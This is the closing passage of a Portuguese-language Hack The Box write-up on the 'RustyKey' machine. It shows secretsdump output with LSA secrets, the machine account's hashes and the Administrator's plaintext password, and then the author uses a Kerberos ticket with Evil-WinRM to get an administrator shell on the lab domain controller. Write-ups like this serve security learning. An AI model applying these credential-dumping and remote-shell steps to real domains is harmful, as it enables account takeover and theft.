</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping LSA Secrets                                                                                                                                                                       
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=nv>$MACHINE</span>.ACC                                                                                                                                                                              
</span></span><span class=line><span class=cl>RUSTYKEY<span class=se>\D</span>C$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae4
</span></span><span class=line><span class=cl>8ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093
</span></span><span class=line><span class=cl>303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25                                                          
</span></span><span class=line><span class=cl>RUSTYKEY<span class=se>\D</span>C$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::                                                                                                             
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> DefaultPassword                                                                                                                                                                           
</span></span><span class=line><span class=cl>RUSTYKEY<span class=se>\A</span>dministrator:Rustyrc4key#!                                            
</span></span><span class=line><span class=cl>...                                                                              
</span></span></code></pre></div><p>O <code>secretsDump</code> nos retornou a senha do <strong>Administrator</strong>, então não precisamos utilizar a hash. E para finalizar a máquina, só falta solicitar o TGT do <strong>Administrator</strong> e pegar a flag root:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt;export <span class=nv>KRB5CCNAME</span><span class=o>=</span>Administrator.ccache                                
</span></span><span class=line><span class=cl>&gt;evil-winrm -r RUSTYKEY.HTB -i dc.rustykey.htb
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Evil-WinRM shell v3.7
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt;
</span></span></code></pre></div></div><section class="flex flex-row flex-wrap justify-center pt-4 text-xl"><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/&amp;title=RustyKey%20-%20HTB" title="Compartilhar pelo LinkedIn" aria-label="Compartilhar pelo LinkedIn"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://twitter.com/intent/tweet/?url=https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/&amp;text=RustyKey%20-%20HTB" title="Tweet no Twitter" aria-label="Tweet no Twitter"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
</a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://bsky.app/intent/compose?text=RustyKey%20-%20HTB+https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/" title aria-label><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 232.562c-21.183-41.196-78.868-117.97-132.503-155.834-51.378-36.272-70.978-29.987-83.828-24.181-14.872 6.72-17.577 29.554-17.577 42.988.0 13.433 7.365 110.138 12.169 126.281 15.873 53.336 72.376 71.358 124.413 65.574 2.66-.395 5.357-.759 8.089-1.097-2.68.429-5.379.796-8.089 1.097-76.259 11.294-143.984 39.085-55.158 137.972C201.224 526.527 237.424 403.67 256 341.379c18.576 62.291 39.972 180.718 150.734 83.983 83.174-83.983 22.851-126.674-53.408-137.969-2.71-.302-5.409-.667-8.089-1.096 2.732.337 5.429.702 8.089 1.096 52.037 5.785 108.54-12.239 124.413-65.574 4.804-16.142 12.169-112.847 12.169-126.281.0-13.434-2.705-36.267-17.577-42.988-12.85-5.806-32.45-12.09-83.829 24.181C334.868 114.595 277.183 191.366 256 232.562z"/></svg></span>
</a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://s2f.kytta.dev/?text=RustyKey%20-%20HTB%20https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/" title aria-label><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48.0.0.0-63.72 28.5-63.72 125.7.0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.54 102.54.0 01-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5zm-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://reddit.com/submit/?url=https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/&amp;resubmit=true&amp;title=RustyKey%20-%20HTB" title="Postar no Reddit" aria-label="Postar no Reddit"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8.0-24.9-11.1-24.9-24.6.0-13.8 11.1-24.9 24.9-24.9 13.6.0 24.6 11.1 24.6 24.9.0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4.0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7.0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9.0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5.0 52.6 59.2 95.2 132 95.2 73.1.0 132.3-42.6 132.3-95.2.0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6.0-2.2-2.2-6.1-2.2-8.3.0-2.5 2.5-2.5 6.4.0 8.6 22.8 22.8 87.3 22.8 110.2.0 2.5-2.2 2.5-6.1.0-8.6-2.2-2.2-6.1-2.2-8.3.0zm7.7-75c-13.6.0-24.6 11.1-24.6 24.9.0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.1 24.9-24.6.0-13.8-11-24.9-24.9-24.9z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://pinterest.com/pin/create/bookmarklet/?url=https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/&amp;description=RustyKey%20-%20HTB" title="Pin no Pinterest" aria-label="Pin no Pinterest"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6.0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8.0 128.7-68.8 128.7-154.3.0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1.0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6.0-54.7 41.4-107.6 112-107.6 60.9.0 103.6 41.5 103.6 100.9.0 67.1-33.9 113.6-78 113.6-24.3.0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6.0-19-10.2-34.9-31.4-34.9-24.9.0-44.9 25.7-44.9 60.2.0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9.0 361.1.0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.facebook.com/sharer/sharer.php?u=https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/&amp;quote=RustyKey%20-%20HTB" title="Compartilhar pelo Facebook" aria-label="Compartilhar pelo Facebook"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14.0 55.52 4.84 55.52 4.84v61h-31.28c-30.8.0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="mailto:?body=https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/&amp;subject=RustyKey%20-%20HTB" title="Enviar por email" aria-label="Enviar por email"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://api.whatsapp.com/send?text=https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/&amp;resubmit=true&amp;title=RustyKey%20-%20HTB" title aria-label><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4.0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3.0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2.0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2.0-101.7 82.8-184.5 184.6-184.5 49.3.0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5.0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8s-14.3 18-17.6 21.8c-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2s-9.7 1.4-14.8 6.9c-5.1 5.6-19.4 19-19.4 46.3.0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://t.me/share/url?url=https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/&amp;resubmit=true&amp;title=RustyKey%20-%20HTB" title aria-label><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M248 8C111.033 8 0 119.033.0 256S111.033 504 248 504 496 392.967 496 256 384.967 8 248 8zM362.952 176.66c-3.732 39.215-19.881 134.378-28.1 178.3-3.476 18.584-10.322 24.816-16.948 25.425-14.4 1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25 5.342-39.5 3.652-3.793 67.107-61.51 68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608 69.142-14.845 10.194-26.894 9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7 18.45-13.7 108.446-47.248 144.628-62.3c68.872-28.647 83.183-33.623 92.511-33.789 2.052-.034 6.639.474 9.61 2.885a10.452 10.452.0 013.53 6.716A43.765 43.765.0 01362.952 176.66z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://line.me/R/share?text=https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/%20RustyKey%20-%20HTB" title="Compartilhar pelo LINE" aria-label="Compartilhar pelo LINE"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M311 196.8v81.3c0 2.1-1.6 3.7-3.7 3.7h-13c-1.3.0-2.4-.7-3-1.5L254 230v48.2c0 2.1-1.6 3.7-3.7 3.7h-13c-2.1.0-3.7-1.6-3.7-3.7V196.9c0-2.1 1.6-3.7 3.7-3.7h12.9c1.1.0 2.4.6 3 1.6l37.3 50.3V196.9c0-2.1 1.6-3.7 3.7-3.7h13c2.1-.1 3.8 1.6 3.8 3.5zm-93.7-3.7h-13c-2.1.0-3.7 1.6-3.7 3.7v81.3c0 2.1 1.6 3.7 3.7 3.7h13c2.1.0 3.7-1.6 3.7-3.7V196.8c0-1.9-1.6-3.7-3.7-3.7zm-31.4 68.1H150.3V196.8c0-2.1-1.6-3.7-3.7-3.7h-13c-2.1.0-3.7 1.6-3.7 3.7v81.3c0 1 .3 1.8 1 2.5.7.6 1.5 1 2.5 1h52.2c2.1.0 3.7-1.6 3.7-3.7v-13c0-1.9-1.6-3.7-3.5-3.7zm193.7-68.1H327.3c-1.9.0-3.7 1.6-3.7 3.7v81.3c0 1.9 1.6 3.7 3.7 3.7h52.2c2.1.0 3.7-1.6 3.7-3.7V265c0-2.1-1.6-3.7-3.7-3.7H344V247.7h35.5c2.1.0 3.7-1.6 3.7-3.7V230.9c0-2.1-1.6-3.7-3.7-3.7H344V213.5h35.5c2.1.0 3.7-1.6 3.7-3.7v-13c-.1-1.9-1.7-3.7-3.7-3.7zM512 93.4v326c-.1 51.2-42.1 92.7-93.4 92.6H92.6C41.4 511.9-.1 469.8.0 418.6V92.6C.1 41.4 42.2-.1 93.4.0h326c51.2.1 92.7 42.1 92.6 93.4zM441.6 233.5c0-83.4-83.7-151.3-186.4-151.3S68.8 150.1 68.8 233.5c0 74.7 66.3 137.4 155.9 149.3 21.8 4.7 19.3 12.7 14.4 42.1-.8 4.7-3.8 18.4 16.1 10.1s107.3-63.2 146.5-108.2c27-29.7 39.9-59.8 39.9-93.1z"/></svg></span></a></section></div><script type=text/javascript src=/CatOverflow/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_writeups/rustykey-htb/index.md data-oid-likes=likes_writeups/rustykey-htb/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"></footer></article><div id=scroll-to-top class="fixed bottom-24 end-6 z-50 transform translate-y-4 opacity-0 duration-200"><a href=#the-top class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Ir para o topo" title="Ir para o topo">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
Richard Silva</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Movido por <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/CatOverflow/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://richard-natan.github.io/CatOverflow/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Pesquisar tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Fechar (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>